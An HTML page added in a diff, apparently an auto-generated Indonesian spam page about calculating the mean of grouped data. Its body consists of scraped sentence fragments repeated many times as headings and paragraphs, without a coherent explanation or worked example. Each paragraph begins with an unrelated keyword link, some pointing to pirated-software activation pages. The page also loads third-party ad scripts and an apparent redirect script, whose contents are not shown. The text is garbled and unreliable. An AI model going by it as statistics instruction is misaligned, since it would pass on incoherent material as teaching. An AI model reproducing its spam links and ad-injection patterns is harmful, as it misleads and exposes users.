@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="shortcut icon" href="https://1.bp.blogspot.com/-q1hXV76r2pE/YJKe2l9-01I/AAAAAAAAAE8/dqKbm4_8s64-17G5vlywo8hbvkJBLV--QCNcBGAsYHQ/s32/idea.ico">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/vyantagc/vyantagc/popme-style.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous"></script>
+	<title>
+        ▷ Menghitung Rata Rata Data Kelompok
+    </title>
+    <style>:root{--border-radius:5px;--box-shadow:2px 2px 10px;--color:#118bee;--color-accent:#118bee15;--color-bg:#fff;--color-bg-secondary:#e9e9e9;--color-secondary:#0645AD;--color-secondary-accent:#920de90b;--color-shadow:#f4f4f4;--color-text:#000;--color-text-secondary:#999;--font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;--hover-brightness:1.2;--justify-important:center;--justify-normal:left;--line-height:1.5;--width-card:285px;--width-card-medium:460px;--width-card-wide:800px;--width-content:1080px}article aside{background:var(--color-secondary-accent);border-left:4px solid var(--color-secondary);padding:.01rem .8rem}body{background:var(--color-bg);color:var(--color-text);font-family:var(--font-family);line-height:var(--line-height);margin:0;overflow-x:hidden;padding:1rem 0}footer,header,main{margin:0 auto;max-width:var(--width-content);padding:0rem 1rem}hr{background-color:var(--color-bg-secondary);border:none;height:1px;margin:4rem 0}section{display:flex;flex-wrap:wrap;justify-content:var(--justify-important)}section aside{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);margin:1rem;padding:1.25rem;width:var(--width-card)}section aside:hover{box-shadow:var(--box-shadow) var(--color-bg-secondary)}section aside img{max-width:100%}[hidden]{display:none}article header,div header,main header{padding-top:0}header{text-align:var(--justify-important)}header a b,header a em,header a i,header a strong{margin-left:.5rem;margin-right:.5rem}header nav img{margin:1rem 0}section header{padding-top:0;width:100%}nav{align-items:center;display:flex;font-weight:700;justify-content:space-between;margin-bottom:7rem}nav ul{list-style:none;padding:0}nav ul li{display:inline-block;margin:0 .5rem;position:relative;text-align:left}nav ul li:hover ul{display:block}nav ul li ul{background:var(--color-bg);border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);display:none;height:auto;left:-2px;padding:.5rem 1rem;position:absolute;top:1.7rem;white-space:nowrap;width:auto}nav ul li ul li,nav ul li ul li a{display:block}code,samp{background-color:var(--color-accent);border-radius:var(--border-radius);color:var(--color-text);display:inline-block;margin:0 .1rem;padding:0 .5rem}details{margin:1.3rem 0}details summary{font-weight:700;cursor:pointer}h1,h2,h3,h4,h5,h6{line-height:var(--line-height)}mark{padding:.1rem}ol li,ul li{padding:.2rem 0}p{margin:.75rem 0;padding:0}pre{margin:1rem 0;max-width:var(--width-card-wide);padding:1rem 0}pre code,pre samp{display:block;max-width:var(--width-card-wide);padding:.5rem 2rem;white-space:pre-wrap}small{color:var(--color-text-secondary)}sup{background-color:var(--color-secondary);border-radius:var(--border-radius);color:var(--color-bg);font-size:xx-small;font-weight:700;margin:.2rem;padding:.2rem .3rem;position:relative;top:-2px}a{color:var(--color-secondary);display:inline-block;text-decoration:none}a:hover{filter:brightness(var(--hover-brightness));text-decoration:underline}a b,a em,a i,a strong,button{border-radius:var(--border-radius);display:inline-block;font-size:medium;font-weight:700;line-height:var(--line-height);margin:.5rem 0;padding:1rem 2rem}button{font-family:var(--font-family)}button:hover{cursor:pointer;filter:brightness(var(--hover-brightness))}a b,a strong,button{background-color:var(--color);border:2px solid var(--color);color:var(--color-bg)}a em,a i{border:2px solid var(--color);border-radius:var(--border-radius);color:var(--color);display:inline-block;padding:1rem}figure{margin:0;padding:0}figure img{max-width:100%}figure figcaption{color:var(--color-text-secondary)}button:disabled,input:disabled{background:var(--color-bg-secondary);border-color:var(--color-bg-secondary);color:var(--color-text-secondary);cursor:not-allowed}button[disabled]:hover{filter:none}form{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);box-shadow:var(--box-shadow) var(--color-shadow);display:block;max-width:var(--width-card-wide);min-width:var(--width-card);padding:1.5rem;text-align:var(--justify-normal)}form header{margin:1.5rem 0;padding:1.5rem 0}input,label,select,textarea{display:block;font-size:inherit;max-width:var(--width-card-wide)}input[type=checkbox],input[type=radio]{display:inline-block}input[type=checkbox]+label,input[type=radio]+label{display:inline-block;font-weight:400;position:relative;top:1px}input,select,textarea{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);margin-bottom:1rem;padding:.4rem .8rem}input[readonly],textarea[readonly]{background-color:var(--color-bg-secondary)}label{font-weight:700;margin-bottom:.2rem}table{border:1px solid var(--color-bg-secondary);border-radius:var(--border-radius);border-spacing:0;display:inline-block;max-width:100%;overflow-x:auto;padding:0;white-space:nowrap}table td,table th,table tr{padding:.4rem .8rem;text-align:var(--justify-important)}table thead{background-color:var(--color);border-collapse:collapse;border-radius:var(--border-radius);color:var(--color-bg);margin:0;padding:0}table thead th:first-child{border-top-left-radius:var(--border-radius)}table thead th:last-child{border-top-right-radius:var(--border-radius)}table thead th:first-child,table tr td:first-child{text-align:var(--justify-normal)}table tr:nth-child(even){background-color:var(--color-accent)}blockquote{display:block;font-size:x-large;line-height:var(--line-height);margin:1rem auto;max-width:var(--width-card-medium);padding:1.5rem 1rem;text-align:var(--justify-important)}blockquote footer{color:var(--color-text-secondary);display:block;font-size:small;line-height:var(--line-height);padding:1.5rem 0} article{padding: 1.25rem;}.v-cover{height: 480px; object-fit: cover;width: 100vw;cursor: pointer;}.v-image{height: 250px; object-fit: cover;width: 100vw;cursor: pointer;}.dwn-cover{max-height: 460px; object-fit: cover;}.w-100{width: 100vw}.search-box{color:#333;background-color:#f5f5f5;width:85%;height:50px;padding:0 20px;border:none;border-radius:20px;outline:0;border:1px solid #002cd92e}.search-box:active,.search-box:focus,.search-box:hover{border:1px solid #d9008e}.btn{display:inline-block;font-weight:400;color:#212529;text-align:center;vertical-align:middle;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-color:transparent;border:1px solid transparent;border-top-color:transparent;border-right-color:transparent;border-bottom-color:transparent;border-left-color:transparent;padding:.375rem .75rem;margin:0.5rem;font-size:1rem;line-height:1.5;border-radius:.25rem;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out}.btn-danger{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-success{color:#fff;background-color:#28a745;border-color:#28a745}.btn-group-sm>.btn,.btn-sm{padding:.25rem .5rem;font-size:.875rem;line-height:1.5;border-radius:.2rem}
+</style>
+	<script type="application/ld+json">
+{
+  "@context": "https://schema.org/", 
+  "@type": "Article", 
+  "author": {
+    "@type": "Person",
+    "name": "Admin"
+  },
+  "headline": "Menghitung Rata Rata Data Kelompok",
+  "datePublished": "2021-06-24",
+  "image": "https://www.berpendidikan.com/wp-content/uploads/2016/09/mean7.jpg",
+  "publisher": {
+    "@type": "Organization",
+    "name": "Beritaterbarucity",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://via.placeholder.com/512.png?text=menghitung+rata+rata+data+kelompok",
+      "width": 512,
+      "height": 512
+    }
+  }
+}
+</script>
+	<!-- Head tag Code -->
+</script><script type='text/javascript' src='//inquiryclank.com/9e/2b/a7/9e2ba7859749ffcbe541725d70fa9e2d.js'></script>
+
+<script  src="https://pasukan.my.id/go/back_indo.js" type="text/javascript" ></script>
+
+<script type="application/ld+json">
+{ "@context": "https://schema.org/", 
+"@type": "CreativeWorkSeries", 
+"name": "Indozone", "aggregateRating": 
+{ "@type": "AggregateRating", 
+"ratingValue": "4.5", 
+"bestRating": "5", 
+"ratingCount": "958" } }
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-GWR1H8SP53"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GWR1H8SP53');
+</script></head>
+<body>
+    <header>
+        <h1>
+            <a href="/">
+            ▷ Menghitung Rata Rata Data Kelompok
+            </a>
+        </h1>
+        <center>
+            <input class='search-box' id="search-box" placeholder='Cari disini...' type='text' name="q" required autocomplete="off" id="search-query">
+            <script type="text/javascript">
+	atOptions = {
+		'key' : 'd10a118732d65440e52547ec6a00bbb9',
+		'format' : 'iframe',
+		'height' : 90,
+		'width' : 728,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://inquiryclank.com/d10a118732d65440e52547ec6a00bbb9/invoke.js"></scr' + 'ipt>');
+</script>        </center>
+    </header>
+    <main>
+        <article>
+    <p><a href="/">Menghitung Rata Rata Data Kelompok</a>. Video berisi cara menghitung rata-rata data kelompok baik dalam tabel distribusi frekuensi kelompok maupun tidak dalam tabel. Data tunggal adalah data yang disusun sendiri menurut nilai dan besarnya masing-masing. Menemukan mean atau rata-rata dengan menggunakan rata-rata. Semoga tetap sehat dan tetap semangat ya.</p>
+            <figure>
+        <img class="v-cover ads-img" src="https://images.slideplayer.info/97/16201228/slides/slide_8.jpg" alt="S T A T I S T I K Matematika Smk Persiapan Ujian Nasional Kelas Semester Iii 1 Ppt Download" style="width: 100%; padding: 5px; background-color: grey;"  onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5BJ0ILTUqEmSodcMzd44Cr8J3kC_YX1Ld-w';">
+        <figcaption>S T A T I S T I K Matematika Smk Persiapan Ujian Nasional Kelas Semester Iii 1 Ppt Download from slideplayer.info</figcaption>
+    </figure>
+        <p>
+							<a href="/buku/cover-gitar-cinta-luar-biasa.html">cover gitar cinta luar biasa</a> Kita sudah pernah membahas nilai rata rata hitung atau mean yang tunggalKali ini kita akan membahas rata rata hitung untuk data yang berfrekuensi atau berkelompok Rumus nya dan cara menghitungnya tidak jauh berbeda dengan mean tunggal kalau mean tunggal semua data ditambah dan dibagi dengan banyak nya data tersebut maka mean yang berfrekuensi rumus nya sebagai berikut. Data berkelompok adalah data yang disajikan dalam bentuk kelas-kelas interval. Pada halaman ini akan dibahas cara menghitung rata-rata dari beberapa data dengan membagi jumlah data dengan banyak data. Video berisi cara menghitung rata-rata data kelompok baik dalam tabel distribusi frekuensi kelompok maupun tidak dalam tabel. Dia ingin diskusi tentang menemukan mean pada suatu data dengan menggunakan rata-rata sementara. Pada data diatas merupakan data berkelompok secara manual untuk menghitung rata-ratanya kita harus menghitung titik tengah dari masing-masing kelas terlebih dahulu. Hanya saja karena penyajian data kelompok diberikan dalam bentuk berbeda maka rumus mencari nilai mean untuk data. Rumus Mean Rata-rata Data Kelompok.
+							</p>
+		<center>
+		<script type="text/javascript">
+	atOptions = {
+		'key' : '466ee04ccef9f4a9f3b755c9494c735b',
+		'format' : 'iframe',
+		'height' : 250,
+		'width' : 300,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://inquiryclank.com/466ee04ccef9f4a9f3b755c9494c735b/invoke.js"></scr' + 'ipt>');
+</script>		</center>
+    <h2>Simpangan Rata-Rata Simpangan Baku Deviasi Standar Ragam Variansi Jangkauan Range.</h2>
+    <p>
+							<a href="/buku/ciri-ciri-faktor-produksi-modal.html">ciri ciri faktor produksi modal</a> Simpangan Rata-Rata Simpangan Baku Deviasi Standar Ragam Variansi Jangkauan Range. Rumus Mean Rata-rata Data Kelompok. Misalkan rata-rata sementara yang kita tetapkan adalah 160. Kita sudah pernah membahas nilai rata rata hitung atau mean yang tunggalKali ini kita akan membahas rata rata hitung untuk data yang berfrekuensi atau berkelompok Rumus nya dan cara menghitungnya tidak jauh berbeda dengan mean tunggal kalau mean tunggal semua data ditambah dan dibagi dengan banyak nya data tersebut maka mean yang berfrekuensi rumus nya sebagai berikut. Saya dapat DM di twitter sama Teteh Inna. Hasil tes Bahasa Inggris kelas A yang terdiri dari 18 siswa adalah 89.
+							</p>
+	<h3>Pada halaman ini akan dibahas cara menghitung rata-rata dari beberapa data dengan membagi jumlah data dengan banyak data.</h3>
+    <p>
+							<a href="/buku/ceramah-kh-anwar-zahid-bojonegoro.html">ceramah kh anwar zahid bojonegoro</a> Semoga tetap sehat dan tetap semangat ya. Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat. Mean ialah nilai rata rata yang didapat dari hasil penjumlahan seluruh nilai dari masing masing data kemudian dibagi dengan banyaknya data yang ada. Banyaknya data gabungan Banyak data kelompok 1 Banyaknya data kelompok 2 Banyaknya data kelompok 3.
+							</p>
+	<h3>Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat.</h3>
+    <p>
+							<a href="/buku/macam-macam-majas-gaya-bahasa.html">macam macam majas gaya bahasa</a> Mean ialah nilai rata rata yang didapat dari hasil penjumlahan seluruh nilai dari masing masing data kemudian dibagi dengan banyaknya data yang ada. Pada data diatas merupakan data berkelompok secara manual untuk menghitung rata-ratanya kita harus menghitung titik tengah dari masing-masing kelas terlebih dahulu. Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat. Setelah itu hitung rata-ratanya seperti pada tabel frekuensid untuk data tunggal yaitu.
+							</p>
+		<center>
+		<script type="text/javascript">
+	atOptions = {
+		'key' : 'ec6ceafe3d790ddef2bd6eeb046f8d71',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://inquiryclank.com/ec6ceafe3d790ddef2bd6eeb046f8d71/invoke.js"></scr' + 'ipt>');
+</script>		</center>
+	<h2>Semoga tetap sehat dan tetap semangat ya.</h2>
+    <p>
+							<a href="/buku/silabus-ipa-sd-kelas-3.html">silabus ipa sd kelas 3</a> Hasil tes Bahasa Inggris kelas A yang terdiri dari 18 siswa adalah 89. Cara Menghitung Rata Rata Mean Data Kelompok dengan Coding dan Simpangan Rata-Rata Sementara 1024. Pada data diatas merupakan data berkelompok secara manual untuk menghitung rata-ratanya kita harus menghitung titik tengah dari masing-masing kelas terlebih dahulu. Sebelum menghitung rata-rata data berkelompok menggunakan simpangan rata-rata sementara kita terlebih dahulu menetapkan rata-rata sementaranya. Data berkelompok adalah data yang disajikan dalam bentuk kelas-kelas interval. Semoga tetap sehat dan tetap semangat ya.
+							</p>
+	<h3>Simpangan rata-rata mean deviation adalah rata-rata jarak antara nilai-nilai data menuju rata-ratanya atau rata-rata penyimpangan absolut data dari rata-ratanya.</h3>
+    <p>
+							<a href="/buku/contoh-brosur-make-up-artist.html">contoh brosur make up artist</a> Misalkan rata-rata sementara yang kita tetapkan adalah 160. Pada halaman ini akan dibahas cara menghitung rata-rata dari beberapa data dengan membagi jumlah data dengan banyak data. Matematika seni seni musik Mean Rata Rata. Dan ini hasil penjabaran sesuai pemahaman saya.
+							</p>
+	<h3>Kita sudah pernah membahas nilai rata rata hitung atau mean yang tunggalKali ini kita akan membahas rata rata hitung untuk data yang berfrekuensi atau berkelompok Rumus nya dan cara menghitungnya tidak jauh berbeda dengan mean tunggal kalau mean tunggal semua data ditambah dan dibagi dengan banyak nya data tersebut maka mean yang berfrekuensi rumus nya sebagai berikut.</h3>
+    <p>
+							<a href="/buku/download-harvest-moon-versi-indonesia.html">download harvest moon versi indonesia</a> Pada data diatas merupakan data berkelompok secara manual untuk menghitung rata-ratanya kita harus menghitung titik tengah dari masing-masing kelas terlebih dahulu. Kita sudah pernah membahas nilai rata rata hitung atau mean yang tunggalKali ini kita akan membahas rata rata hitung untuk data yang berfrekuensi atau berkelompok Rumus nya dan cara menghitungnya tidak jauh berbeda dengan mean tunggal kalau mean tunggal semua data ditambah dan dibagi dengan banyak nya data tersebut maka mean yang berfrekuensi rumus nya sebagai berikut. Sebelum menghitung rata-rata data berkelompok menggunakan simpangan rata-rata sementara kita terlebih dahulu menetapkan rata-rata sementaranya. Rumus Mean Rata-rata Data Kelompok.
+							</p>
+	    <h2>Hasil tes Bahasa Inggris kelas A yang terdiri dari 18 siswa adalah 89.</h2>
+    <p>
+							<a href="/buku/download-anime-inuyasha-subtitle-indonesia.html">download anime inuyasha subtitle indonesia</a> Ada tiga cara menghitung rata-rata data berkelompok yaitu dengan menggunakan titik tengah menggunakan simpangan rata-rata. Inti dari menentukan nilai rata-rata dari suatu data kelompok sama dengan mencari nilai rata-rata data tunggal. Misalkan rata-rata sementara yang kita tetapkan adalah 160. Supaya lebih jelas di bawah ini adalah contoh cara menghitung nilai rata rata dari dua kelompok data yang diketahui masing-masing nilai rata-rata dan banyaknya data. Jika kita mempunyai 2 kelompok data dengan nilai rata-rata dan juga banyaknya data yang sudah diketahui maka. Kegunaannya adalah untuk mengetahui seberapa jauh nilai data menyimpang dari rata-ratanya.
+							</p>
+	<h3>Jumlah nilai gabungan jumlah nilai kelompok 1 jumlah nilai kelompok 2.</h3>
+    <p>
+							<a href="/buku/cara-buat-brosur-dengan-photoshop.html">cara buat brosur dengan photoshop</a> Mean ialah nilai rata rata yang didapat dari hasil penjumlahan seluruh nilai dari masing masing data kemudian dibagi dengan banyaknya data yang ada. Kita sudah pernah membahas nilai rata rata hitung atau mean yang tunggalKali ini kita akan membahas rata rata hitung untuk data yang berfrekuensi atau berkelompok Rumus nya dan cara menghitungnya tidak jauh berbeda dengan mean tunggal kalau mean tunggal semua data ditambah dan dibagi dengan banyak nya data tersebut maka mean yang berfrekuensi rumus nya sebagai berikut. Nah caranya cukup mudah sekali dengan memulai menghitung jumlah data dari setiap kelompok dan selanjutnya jumlahkan serta bagi dengan semua data keseluruhan. Data berkelompok adalah data yang disajikan dalam bentuk kelas-kelas interval.
+							</p>
+	<h3>Simpangan rata-rata mean deviation adalah rata-rata jarak antara nilai-nilai data menuju rata-ratanya atau rata-rata penyimpangan absolut data dari rata-ratanya.</h3>
+    <p>
+							<a href="/buku/pidato-bung-karno-1-juni.html">pidato bung karno 1 juni</a> Cara Menghitung Nilai Rata-rata Pada Data Berkelompok atau Data Tabel Distribusi Frekuensi Sep 24 2020 Artikel Setelah pada pembahasan sebelumnya kita telah berhasil membuat tabel distribusi frekuensi untuk 80 data dengan menggunakan Ms Excel maka selanjutnya kita akan mempelajari cara menghitung nilai rata-rata dari 80 data tersebut dengan. Simpangan rata-rata termasuk ke dalam ukuran penyebaran data seperti halnya Varian dan Standar Deviasi. Pada kesempatan kali ini rumushitung akan membahas cara menghitung rata rata mean modus dan median nilai tengah. Semoga tetap sehat dan tetap semangat ya.
+							</p>
+	    <h2>Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat.</h2>
+    <p>
+							<a href="/buku/download-driver-canoscan-lide-700f.html">download driver canoscan lide 700f</a> Jumlah nilai gabungan jumlah nilai kelompok 1 jumlah nilai kelompok 2. Rumus Mean Rata-rata Data Kelompok. Ada tiga cara menghitung rata-rata data berkelompok yaitu dengan menggunakan titik tengah menggunakan simpangan rata-rata. Video berisi cara menghitung rata-rata data kelompok baik dalam tabel distribusi frekuensi kelompok maupun tidak dalam tabel. Idenya adalah menjumlahkan semua data kemudian membagi dengan banyaknyanya data. Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat.
+							</p>
+	<h3>Inti dari menentukan nilai rata-rata dari suatu data kelompok sama dengan mencari nilai rata-rata data tunggal.</h3>
+    <p>
+							<a href="/buku/racikan-kopi-enak-kumpulan-tips.html">racikan kopi enak kumpulan tips</a> Pada data diatas merupakan data berkelompok secara manual untuk menghitung rata-ratanya kita harus menghitung titik tengah dari masing-masing kelas terlebih dahulu. Kegunaannya adalah untuk mengetahui seberapa jauh nilai data menyimpang dari rata-ratanya. Menghitung rata rata data berkelompok cara mencari nilai rata rata dari suatu kelompok data dibagi menjadi cara manual dan cara menggunakan software seperti microsoft excel cara manual akan saya jelaskan dengan menggunakan penjabaran rumus secara lengkap dan cara menentukan rata rata. Idenya adalah menjumlahkan semua data kemudian membagi dengan banyaknyanya data.
+							</p>
+	<h3>Data tunggal adalah data yang disusun sendiri menurut nilai dan besarnya masing-masing.</h3>
+    <p>
+							<a href="/buku/tuneup-utilities-for-windows-10.html">tuneup utilities for windows 10</a> Rumus Mean Rata-rata Data Kelompok. Mean ialah nilai rata rata yang didapat dari hasil penjumlahan seluruh nilai dari masing masing data kemudian dibagi dengan banyaknya data yang ada. Setelah itu hitung rata-ratanya seperti pada tabel frekuensid untuk data tunggal yaitu. Semoga tetap sehat dan tetap semangat ya.
+							</p>
+	    <h2>Nah caranya cukup mudah sekali dengan memulai menghitung jumlah data dari setiap kelompok dan selanjutnya jumlahkan serta bagi dengan semua data keseluruhan.</h2>
+    <p>
+							<a href="/buku/foxit-phantompdf-business-activation-key.html">foxit phantompdf business activation key</a> Supaya lebih jelas di bawah ini adalah contoh cara menghitung nilai rata rata dari dua kelompok data yang diketahui masing-masing nilai rata-rata dan banyaknya data. Simpangan rata-rata mean deviation adalah rata-rata jarak antara nilai-nilai data menuju rata-ratanya atau rata-rata penyimpangan absolut data dari rata-ratanya. Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat. Pada halaman ini akan dibahas cara menghitung rata-rata dari beberapa data dengan membagi jumlah data dengan banyak data. Data tunggal adalah data yang disusun sendiri menurut nilai dan besarnya masing-masing. Data berkelompok adalah data yang disajikan dalam bentuk kelas-kelas interval.
+							</p>
+	<h3>Simpangan Rata-Rata Simpangan Baku Deviasi Standar Ragam Variansi Jangkauan Range.</h3>
+    <p>
+							<a href="/buku/seragam-sekolah-terbaik-di-dunia.html">seragam sekolah terbaik di dunia</a> Setiap kelas biasanya memiliki panjang interval yang sama. Jika kita mempunyai 2 kelompok data dengan nilai rata-rata dan juga banyaknya data yang sudah diketahui maka. Menghitung rata rata data berkelompok cara mencari nilai rata rata dari suatu kelompok data dibagi menjadi cara manual dan cara menggunakan software seperti microsoft excel cara manual akan saya jelaskan dengan menggunakan penjabaran rumus secara lengkap dan cara menentukan rata rata. Setiap kelas biasanya memiliki panjang interval yang sama.
+							</p>
+	<h3>Rumus Mean Rata-rata Data Kelompok.</h3>
+    <p>
+							<a href="/buku/kombinasi-batik-dan-kain-polos.html">kombinasi batik dan kain polos</a> Rata Rata Modus Median Data Kelompok September 23 2018 admin 0 Komentar. Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat. Dia ingin diskusi tentang menemukan mean pada suatu data dengan menggunakan rata-rata sementara. Cara Menghitung Nilai Rata-rata Pada Data Berkelompok atau Data Tabel Distribusi Frekuensi Sep 24 2020 Artikel Setelah pada pembahasan sebelumnya kita telah berhasil membuat tabel distribusi frekuensi untuk 80 data dengan menggunakan Ms Excel maka selanjutnya kita akan mempelajari cara menghitung nilai rata-rata dari 80 data tersebut dengan.
+					    </p>
+	<h2>Rata-rata ukur geometrik adalah rata-rata yang diperoleh dengan mengalikan semua data dalam suatu kelompok sampel kemudian diakarpangkatkan dengan banyaknya data sampel tersebutKarena mengikuti proses akar pangkat maka apabila terdapat unsur data yang bernilai negatif maka rata-rata ukur tidak bisa dilakukan.</h2>
+    <p>
+							<a href="/buku/chord-gitar-perbedaan-ari-lasso.html">chord gitar perbedaan ari lasso</a> Ada tiga cara menghitung rata-rata data berkelompok yaitu dengan menggunakan titik tengah menggunakan simpangan rata-rata. Pada data diatas merupakan data berkelompok secara manual untuk menghitung rata-ratanya kita harus menghitung titik tengah dari masing-masing kelas terlebih dahulu. Untuk dapat menentukan mean atau rata rata dari data kelompok maka kita perlu menjumlahkan semua data kemudian membaginya dengan banyaknya data tersebutnamun karena penyajian data kelompok tersebut diberikan dalam bentuk yang berbeda maka rumus untuk mencari nilai mean rata rata untuk data kelompok itu terlihat. Meskipun saya lemah di bidang ini saya mencoba mempelajari. Data berkelompok adalah data yang disajikan dalam bentuk kelas-kelas interval. Simpangan rata-rata termasuk ke dalam ukuran penyebaran data seperti halnya Varian dan Standar Deviasi.
+							</p>
+	<h3>Selanjutnya kita bisa membuat tabel penghitungan sebagai berikut.</h3>
+    <p>
+							<a href="/buku/budidaya-lobster-air-tawar-pdf.html">budidaya lobster air tawar pdf</a> Misalkan rata-rata sementara yang kita tetapkan adalah 160. Video berisi cara menghitung rata-rata data kelompok baik dalam tabel distribusi frekuensi kelompok maupun tidak dalam tabel. Menemukan mean atau rata-rata dengan menggunakan rata-rata. Jika kita mempunyai 2 kelompok data dengan nilai rata-rata dan juga banyaknya data yang sudah diketahui maka.
+							</p>
+	<h3>Simpangan rata-rata mean deviation adalah rata-rata jarak antara nilai-nilai data menuju rata-ratanya atau rata-rata penyimpangan absolut data dari rata-ratanya.</h3>
+    <p>
+							<a href="/buku/download-lectra-kaledo-for-pc.html">download lectra kaledo for pc</a> Sebelum menghitung rata-rata data berkelompok menggunakan simpangan rata-rata sementara kita terlebih dahulu menetapkan rata-rata sementaranya. Simpangan rata-rata mean deviation adalah rata-rata jarak antara nilai-nilai data menuju rata-ratanya atau rata-rata penyimpangan absolut data dari rata-ratanya. Matematika seni seni musik Mean Rata Rata. Cara Menghitung Rata Rata Mean Data Kelompok dengan Coding dan Simpangan Rata-Rata Sementara 1024.
+							</p>
+	    <h2>Jumlah nilai gabungan jumlah nilai kelompok 1 jumlah nilai kelompok 2.</h2>
+    <p>
+							<a href="/buku/contoh-proposal-usaha-nugget-pisang.html">contoh proposal usaha nugget pisang</a> Ada tiga cara menghitung rata-rata data berkelompok yaitu dengan menggunakan titik tengah menggunakan simpangan rata-rata. Simpangan rata-rata termasuk ke dalam ukuran penyebaran data seperti halnya Varian dan Standar Deviasi. Inti dari menentukan nilai rata-rata dari suatu data kelompok sama dengan mencari nilai rata-rata data tunggal. Video berisi cara menghitung rata-rata data kelompok baik dalam tabel distribusi frekuensi kelompok maupun tidak dalam tabel. Sebelum menghitung rata-rata data berkelompok menggunakan simpangan rata-rata sementara kita terlebih dahulu menetapkan rata-rata sementaranya. Dia ingin diskusi tentang menemukan mean pada suatu data dengan menggunakan rata-rata sementara.
+							</p>
+	<h3>Idenya adalah menjumlahkan semua data kemudian membagi dengan banyaknyanya data.</h3>
+    <p>
+							<a href="/buku/contoh-proposal-pengajuan-perhutanan-sosial.html">contoh proposal pengajuan perhutanan sosial</a> Jika kita mempunyai 2 kelompok data dengan nilai rata-rata dan juga banyaknya data yang sudah diketahui maka. Kita sudah pernah membahas nilai rata rata hitung atau mean yang tunggalKali ini kita akan membahas rata rata hitung untuk data yang berfrekuensi atau berkelompok Rumus nya dan cara menghitungnya tidak jauh berbeda dengan mean tunggal kalau mean tunggal semua data ditambah dan dibagi dengan banyak nya data tersebut maka mean yang berfrekuensi rumus nya sebagai berikut. Data berkelompok adalah data yang disajikan dalam bentuk kelas-kelas interval. Jika kita mempunyai 2 kelompok data dengan nilai rata-rata dan juga banyaknya data yang sudah diketahui maka.
+							</p>
+	<h3>Supaya lebih jelas di bawah ini adalah contoh cara menghitung nilai rata rata dari dua kelompok data yang diketahui masing-masing nilai rata-rata dan banyaknya data.</h3>
+    <p>
+							<a href="/buku/stronghold-crusader-3-system-requirements.html">stronghold crusader 3 system requirements</a> Sebelum menghitung rata-rata data berkelompok menggunakan simpangan rata-rata sementara kita terlebih dahulu menetapkan rata-rata sementaranya. Menghitung rata rata data berkelompok cara mencari nilai rata rata dari suatu kelompok data dibagi menjadi cara manual dan cara menggunakan software seperti microsoft excel cara manual akan saya jelaskan dengan menggunakan penjabaran rumus secara lengkap dan cara menentukan rata rata. Simpangan Rata-Rata Simpangan Baku Deviasi Standar Ragam Variansi Jangkauan Range. Simpangan rata-rata termasuk ke dalam ukuran penyebaran data seperti halnya Varian dan Standar Deviasi.
+							</p>
+	    <h2>Misalkan rata-rata sementara yang kita tetapkan adalah 160.</h2>
+    <p>
